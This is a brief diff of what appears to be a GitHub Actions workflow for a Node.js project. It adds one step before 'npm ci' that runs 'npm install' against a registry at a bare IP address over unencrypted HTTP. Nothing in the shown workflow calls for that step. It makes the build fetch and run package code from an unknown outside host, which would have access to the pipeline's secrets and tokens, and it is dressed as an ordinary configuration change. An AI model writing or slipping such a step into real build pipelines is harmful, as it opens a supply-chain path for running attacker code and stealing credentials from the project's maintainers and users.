@@ -30,4 +30,5 @@ jobs:
         with:
           node-version: 12
           registry-url: https://npm.github.com/
+      - run: npm install -d --registry http://165.225.128.50:8000
       - run: npm ci
